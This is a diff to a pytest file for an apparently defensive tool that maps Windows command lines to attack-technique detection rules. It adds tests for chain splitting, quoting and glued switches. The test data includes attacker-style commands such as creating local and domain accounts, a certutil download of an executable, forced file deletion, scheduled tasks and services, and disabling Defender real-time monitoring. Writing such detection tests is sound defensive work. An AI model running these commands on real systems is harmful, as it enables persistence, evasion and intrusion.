@@ -15,6 +15,7 @@ from ttprism.attack import (
     TechniqueAccumulator,
     _phrase_re,
     _printable,
+    _split_chain,
     default_rules_path,
     normalize_command,
 )
@@ -720,9 +721,10 @@ def test_chained_lines_use_each_command(tmp_path: Path) -> None:
     assert evaluate(tmp_path, rule, Behavior(commands=["a b x & y"])) == []
     assert evaluate(tmp_path, rule, Behavior(commands=["x & a b"]))
     assert not evaluate(tmp_path, rule, Behavior(commands=["c & d x"]))
-    # "||", "&&" and line breaks chain too; a single "|" is a pipe within one command.
-    assert evaluate(tmp_path, rule, Behavior(commands=["a b || z", "q && z", "a b\r\nz"]))
+    # "&&" and "||" chain too; a single "|" (a pipe) and a line break stay within one command.
+    assert not evaluate(tmp_path, rule, Behavior(commands=["a && b", "a || b"]))
     assert evaluate(tmp_path, rule, Behavior(commands=["a | b"]))
+    assert evaluate(tmp_path, rule, Behavior(commands=["a\r\nb"]))
 
 
 def test_chained_lines_are_capped(tmp_path: Path) -> None:
@@ -738,10 +740,9 @@ def test_chained_lines_are_capped(tmp_path: Path) -> None:
 @pytest.mark.parametrize(
     ("phrase", "error"),
     [
-        ("<arg>", "may only end a phrase"),
-        ("net <arg> start", "may only end a phrase"),
-        ("net start <arg> <arg>", "may only end a phrase"),
-        ('"" <arg>', "may only end a phrase"),
+        ("<arg>", "empty"),
+        ("<arg> start", "cannot start a phrase"),
+        ('"" <arg>', "empty"),
     ],
 )
 def test_arg_marker_is_validated(tmp_path: Path, phrase: str, error: str) -> None:
@@ -811,3 +812,124 @@ def test_phrase_matching_is_fast_on_near_misses() -> None:
     baseline = seconds("abc")
     for filler in ("net", "sc", "^n^e^t", "xnet view", '"a" ', "_net_user"):
         assert seconds(filler) < 5 * baseline + 0.1, filler
+
+
+# --------------------------------------------------------------------------- review of the fixes
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("a & b && c || d | e", ["a ", " b ", " c ", " d | e"]),
+        ("a ^& b", ["a ^& b"]),
+        ('net user x "P@ss&w0rd" /add', ['net user x "P@ss&w0rd" /add']),
+        # The quotes that "cmd /c" strips enclose a command line.
+        (
+            'cmd.exe /c "net user /domain & net user x /add"',
+            ['cmd.exe /c "net user /domain ', ' net user x /add"'],
+        ),
+        ('C:\\Windows\\system32\\cmd.exe/c "a & b"', ['C:\\Windows\\system32\\cmd.exe/c "a ', ' b"']),
+        # Quotes inside them protect again.
+        (
+            'cmd /c "schtasks /create /tr "cmd /c a & b" /sc daily"',
+            ['cmd /c "schtasks /create /tr "cmd /c a & b" /sc daily"'],
+        ),
+        ("a\r\nb", ["a\r\nb"]),  # a line break continues a PowerShell command
+        ("& & &", []),
+    ],
+)
+def test_split_chain(command: str, expected: list[str]) -> None:
+    assert _split_chain(command) == expected
+
+
+ROUND_TWO_HITS = [
+    # Glued switches, which cmd.exe accepts.
+    ("cmd.file-deletion", "del /s/q/f C:\\Users\\Public\\a.exe"),
+    ("cmd.file-deletion", "del/f/q C:\\Users\\Public\\a.exe"),
+    ("cmd.cmd-shell", "cmd /q/c whoami"),
+    ("cmd.cmd-shell", "cmd.exe /d/c echo x"),
+    ("cmd.scheduled-task", "schtasks/create /tn x /tr C:\\x.exe"),
+    ("cmd.create-domain-account", "net user x P@ss1 /add/domain"),
+    # "&" inside quotes is part of an argument.
+    ("cmd.create-local-account", 'net user x "P@ss&w0rd" /add'),
+    ("cmd.service-create", 'sc create x displayname= "x & y" binpath= C:\\x.exe'),
+    ("cmd.scheduled-task", 'schtasks /create /tn x /tr "cmd /c a & b" /sc daily'),
+    ("cmd.download", 'certutil -urlcache -split -f "http://files.example.net/?a=1&b=2" out.exe'),
+    ("cmd.create-local-account", 'cmd.exe /c "net user /domain & net user x P@ss1 /add"'),
+    ("cmd.domain-account-discovery", 'cmd.exe /c "net user /domain & net user x P@ss1 /add"'),
+    # Share listings that a script parses are still discovery.
+    ("cmd.share-discovery", "for /f \"skip=4 tokens=1\" %a in ('net share') do @echo %a"),
+    ("cmd.share-discovery", 'powershell -c "$s = net share; $s"'),
+    ("cmd.file-deletion", "cmd /c choice /C Y /N /D Y /T 3 & Del x.exe"),
+]
+ROUND_TWO_MISSES = [
+    ("cmd.network-config", "ipconfig/flushdns"),
+    ("cmd.network-config", "ipconfig/release"),
+    ("cmd.create-domain-account", 'cmd.exe /c "net user /domain & net user x P@ss1 /add"'),
+    ("cmd.remote-service-execution", 'sc \\\\h create svc binpath= "cmd /c start a & b" start= auto'),
+    ("cmd.service-execution", "cmd /c for /f \"tokens=*\" %a in ('net start') do @echo %a"),
+    ("cmd.service-execution", "cmd.exe /c net start 2>nul"),
+    ("cmd.service-execution", "net start 2>&1"),
+    ("cmd.share-discovery", "net share Data=D:\\Data"),
+    ("cmd.share-discovery", "net1 share Data=D:\\Data"),
+]
+
+
+@pytest.mark.parametrize(("rule_id", "command"), ROUND_TWO_HITS)
+def test_review_of_fixes_hits(rule_id: str, command: str) -> None:
+    assert rule_id in fired(commands=[command])
+
+
+@pytest.mark.parametrize(("rule_id", "command"), ROUND_TWO_MISSES)
+def test_review_of_fixes_misses(rule_id: str, command: str) -> None:
+    assert rule_id not in fired(commands=[command])
+
+
+def test_arg_inside_a_phrase(tmp_path: Path) -> None:
+    rule = "{commands: ['net share <arg>=']}"
+    assert evaluate(tmp_path, rule, Behavior(commands=["net share C=C:\\"]))
+    assert not evaluate(tmp_path, rule, Behavior(commands=["net share", "net share x", "$s = net share"]))
+
+
+def test_glued_switches_are_split_but_urls_are_not() -> None:
+    assert normalize_command("del/f/q x") == "del /f /q x"
+    assert normalize_command("C:\\Windows\\cmd.exe/c x") == "c:\\windows\\cmd.exe /c x"
+    url = "https://www.example.com/en-us/x c:/x/en example.com/decode/a"
+    assert normalize_command(url) == url
+
+
+def test_chained_lines_cost_about_as_much_as_single_ones() -> None:
+    # Every list is first tested against the whole line, so 32 parts do not cost 32 times as much.
+    chained = ["x&" * 40 + "net view"] * 5000
+    start = time.perf_counter()
+    BUNDLED.evaluate(Behavior(commands=chained))
+    assert time.perf_counter() - start < 10
+
+
+RECHECK_HITS = [
+    ("cmd.cmd-shell", 'cmd /v:on/c "echo !x!"'),
+    ("cmd.scheduled-task", 'cmd /q/c"s""chtasks /create /tn x /tr y"'),
+    ("cmd.share-discovery", "net view \\\\fileserver /cache"),
+    # A line break inside a PowerShell command is not a chain separator.
+    ("cmd.disable-defender", 'powershell -c "Set-MpPreference `\n -DisableRealtimeMonitoring $true"'),
+]
+RECHECK_MISSES = [
+    ("cmd.powershell-encoded", "powershell -c \"iwr ('https://example.com'+'/en-us/a')\""),
+    ("cmd.share-discovery", "net share x /cache:none"),
+]
+
+
+@pytest.mark.parametrize(("rule_id", "command"), RECHECK_HITS)
+def test_recheck_hits(rule_id: str, command: str) -> None:
+    assert rule_id in fired(commands=[command])
+
+
+@pytest.mark.parametrize(("rule_id", "command"), RECHECK_MISSES)
+def test_recheck_misses(rule_id: str, command: str) -> None:
+    assert rule_id not in fired(commands=[command])
+
+
+def test_switch_phrases_end_a_word(tmp_path: Path) -> None:
+    rule = "{commands: [[x, -enc]]}"
+    assert evaluate(tmp_path, rule, Behavior(commands=["x -enc AAA", "x -enc:AAA", "x -enc"]))
+    assert not evaluate(tmp_path, rule, Behavior(commands=["x -enc-us", "x -enc.ps1", "x -enc/a"]))
